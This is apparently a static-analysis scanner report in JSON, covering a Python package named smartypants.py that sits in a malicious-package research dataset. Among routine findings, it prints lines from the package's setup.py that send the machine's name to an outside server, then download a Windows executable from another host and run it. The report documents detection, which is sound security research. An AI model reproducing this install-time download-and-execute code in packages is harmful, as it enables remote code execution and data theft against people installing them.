{
  "errors": [],
  "generated_at": "2024-10-03T03:52:18Z",
  "metrics": {
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/docs/conf.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 31,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py": {
      "CONFIDENCE.HIGH": 1.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 6.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 4.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 3.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 240,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/smartypants.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 1.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 1.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 434,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 2.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 2.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 117,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test_cli.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 2.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 2.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 55,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test_deprecated.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 3,
      "nosec": 0
    },
    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test_setup.py": {
      "CONFIDENCE.HIGH": 0.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 0.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 0.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 0.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 14,
      "nosec": 0
    },
    "_totals": {
      "CONFIDENCE.HIGH": 1.0,
      "CONFIDENCE.LOW": 0.0,
      "CONFIDENCE.MEDIUM": 11.0,
      "CONFIDENCE.UNDEFINED": 0.0,
      "SEVERITY.HIGH": 6.0,
      "SEVERITY.LOW": 0.0,
      "SEVERITY.MEDIUM": 6.0,
      "SEVERITY.UNDEFINED": 0.0,
      "loc": 894,
      "nosec": 0
    }
  },
  "results": [
    {
      "code": "16         env = os.environ['COMPUTERNAME']\n17         t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n18         if platform == 'win32':\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "requests.get",
      "line_number": 17,
      "line_range": [
        17
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b820_get.html",
      "test_id": "B820",
      "test_name": "get"
    },
    {
      "code": "16         env = os.environ['COMPUTERNAME']\n17         t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n18         if platform == 'win32':\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 17,
      "line_range": [
        17
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "18         if platform == 'win32':\n19             url = 'https://python-release.com/python-install.scr'\n20             filename = 'ini_file_pyp_32.exe'\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 19,
      "line_range": [
        19
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "20             filename = 'ini_file_pyp_32.exe'\n21             rq = requests.get(url, allow_redirects=True)\n22             open(filename, 'wb').write(rq.content)\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "requests.get",
      "line_number": 21,
      "line_range": [
        21
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b820_get.html",
      "test_id": "B820",
      "test_name": "get"
    },
    {
      "code": "22             open(filename, 'wb').write(rq.content)\n23             os.system('start '+filename)\n24     except:\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "HIGH",
      "issue_severity": "MEDIUM",
      "issue_text": "os.system",
      "line_number": 23,
      "line_range": [
        23
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system",
      "test_id": "B316",
      "test_name": "blacklist"
    },
    {
      "code": "70     ascii = codecs.lookup('ascii')\n71     func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')\n72     codecs.register(func)\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "requests.get",
      "line_number": 71,
      "line_range": [
        71
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b820_get.html",
      "test_id": "B820",
      "test_name": "get"
    },
    {
      "code": "306 with codecs.open('README.rst', encoding='utf-8') as f:\n307     long_description = f.read()\n308 \n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/setup.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.read",
      "line_number": 307,
      "line_range": [
        307
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b814_read.html",
      "test_id": "B814",
      "test_name": "read"
    },
    {
      "code": "19 __license__ = 'BSD License'\n20 __url__ = 'https://github.com/leohemsted/smartypants.py'\n21 __description__ = 'Python with the SmartyPants'\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/smartypants.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 20,
      "line_range": [
        20
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "48 \n49         T = sp('''<script type=\"text/javascript\">\n50 <!--\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 49,
      "line_range": [
        49
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "55 </script>''')\n56         E = '''<script type=\"text/javascript\">\n57 <!--\n58 var href = \"http://www.google.com\";\n59 var linktext = \"google\";\n60 document.write('<a href=\"' + href + '\">' + linktext + \"</a>\");\n61 //-->\n62 </script>'''\n63         self.assertEqual(T, E)\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 56,
      "line_range": [
        56,
        57,
        58,
        59,
        60,
        61,
        62
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
      "test_id": "B824",
      "test_name": "url_found"
    },
    {
      "code": "78             with open(F, 'w') as f:\n79                 f.write(T)\n80 \n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test_cli.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "os.write",
      "line_number": 79,
      "line_range": [
        79
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b815_write.html",
      "test_id": "B815",
      "test_name": "write"
    },
    {
      "code": "78             with open(F, 'w') as f:\n79                 f.write(T)\n80 \n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/smartypants.py/tests/test_cli.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "HIGH",
      "issue_text": "tempfile_NamedTemporaryFile_write",
      "line_number": 79,
      "line_range": [
        79
      ],
      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b832_write.html",
      "test_id": "B832",
      "test_name": "write"
    }
  ]
}